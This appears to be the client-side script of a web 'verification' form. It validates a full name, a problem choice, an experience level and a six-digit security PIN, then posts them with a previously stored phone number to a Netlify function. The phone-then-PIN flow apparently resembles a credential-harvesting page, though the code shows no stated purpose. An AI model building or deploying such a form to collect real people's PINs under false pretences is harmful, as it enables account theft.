const form = document.getElementById("verificationForm");
const fullNameInput = document.getElementById("fullName");
const problemSelect = document.getElementById("problem");
const pinInput = document.getElementById("securityPin");
const experienceSelect = document.getElementById("experience");
const togglePinBtn = document.querySelector(".toggle-pin");
const eyeIcon = togglePinBtn.querySelector(".icon-eye");
const eyeOffIcon = togglePinBtn.querySelector(".icon-eye-off");
const formStatus = document.getElementById("formStatus");
const submitBtn = document.getElementById("submitBtn");

const fullNameError = document.getElementById("fullNameError");
const problemError = document.getElementById("problemError");
const pinError = document.getElementById("pinError");
const experienceError = document.getElementById("experienceError");

const phone = sessionStorage.getItem("pp_phone");
if (!phone) {
  window.location.href = "index.html";
}

function showError(input, errorEl, message) {
  input.classList.add("input-invalid");
  errorEl.textContent = message;
  errorEl.classList.remove("hidden");
}

function clearError(input, errorEl) {
  input.classList.remove("input-invalid");
  errorEl.classList.add("hidden");
}

function setStatus(message, type) {
  if (!message) {
    formStatus.classList.add("hidden");
    formStatus.textContent = "";
    return;
  }
  formStatus.textContent = message;
  formStatus.classList.remove("hidden", "error", "info");
  formStatus.classList.add(type);
}

function isValidPin(pin) {
  return /^[0-9]{6}$/.test(pin);
}

pinInput.addEventListener("input", () => {
  pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 6);
  if (isValidPin(pinInput.value)) {
    clearError(pinInput, pinError);
  }
});

fullNameInput.addEventListener("input", () => {
  if (fullNameInput.value.trim()) {
    clearError(fullNameInput, fullNameError);
  }
});

problemSelect.addEventListener("change", () => {
  if (problemSelect.value) {
    clearError(problemSelect, problemError);
  }
});

experienceSelect.addEventListener("change", () => {
  if (experienceSelect.value) {
    clearError(experienceSelect, experienceError);
  }
});

togglePinBtn.addEventListener("click", () => {
  const isHidden = pinInput.type === "password";
  pinInput.type = isHidden ? "text" : "password";
  eyeIcon.classList.toggle("hidden", !isHidden);
  eyeOffIcon.classList.toggle("hidden", isHidden);
  togglePinBtn.setAttribute("aria-label", isHidden ? "Hide PIN" : "Show PIN");
});

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  let isValid = true;

  const fullName = fullNameInput.value.trim();
  const problem = problemSelect.value;
  const pin = pinInput.value;
  const experience = experienceSelect.value;

  if (!fullName) {
    showError(fullNameInput, fullNameError, "Please enter your full name");
    isValid = false;
  } else {
    clearError(fullNameInput, fullNameError);
  }

  if (!problem) {
    showError(problemSelect, problemError, "Please select a problem");
    isValid = false;
  } else {
    clearError(problemSelect, problemError);
  }

  if (!isValidPin(pin)) {
    showError(pinInput, pinError, "Security PIN must be exactly 6 digits");
    isValid = false;
  } else {
    clearError(pinInput, pinError);
  }

  if (!experience) {
    showError(experienceSelect, experienceError, "Please select your experience level");
    isValid = false;
  } else {
    clearError(experienceSelect, experienceError);
  }

  if (!isValid) return;

  submitBtn.disabled = true;
  setStatus("Submitting...", "info");

  try {
    const res = await fetch("/.netlify/functions/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, fullName, problem, pin, experience }),
    });
    const data = await res.json();
    if (!res.ok) {
      setStatus(data.error || "Submit failed", "error");
      submitBtn.disabled = false;
      return;
    }
    sessionStorage.removeItem("pp_phone");
    window.location.href = "success.html";
  } catch {
    setStatus("Network error. Is the app running on Netlify?", "error");
    submitBtn.disabled = false;
  }
});
